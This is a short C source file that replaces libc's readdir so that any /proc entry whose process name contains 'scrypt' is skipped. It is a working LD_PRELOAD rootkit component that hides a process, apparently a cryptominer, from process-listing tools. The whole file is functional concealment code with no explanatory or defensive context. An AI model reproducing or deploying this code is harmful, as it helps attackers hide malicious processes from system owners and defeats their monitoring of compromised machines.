#include <dirent.h>
#include <dlfcn.h>
#include <string.h>
#include <stdio.h>

static struct dirent* (*orig_readdir)(DIR *dirp) = NULL;
static const char* hiddenProcess = "scrypt";

struct dirent* readdir(DIR *dirp){

    void *handle;

    if(orig_readdir == NULL){
        handle = dlopen("libc.so.6",RTLD_LAZY);
        orig_readdir = dlsym(handle,"readdir");
    }

    struct dirent* dir;

    dir = orig_readdir(dirp);

    if(dir == NULL){
        return dir;
    }
        
    if(dir){
        char dir_name[256];
        char process_name[256];
        int initValue;

        snprintf(dir_name,sizeof(dir_name),"/proc/%s/stat",dir->d_name);
        FILE *f = fopen(dir_name, "r");
        if(f == NULL){
            return dir;
        }
        fscanf(f,"%d %s",&initValue,process_name);
        //printf("A \n");
        fclose(f);
        //printf("A \n");
       
        if(strstr(process_name,hiddenProcess)){
            dir = orig_readdir(dirp);
        }
    }
        
    return dir;
}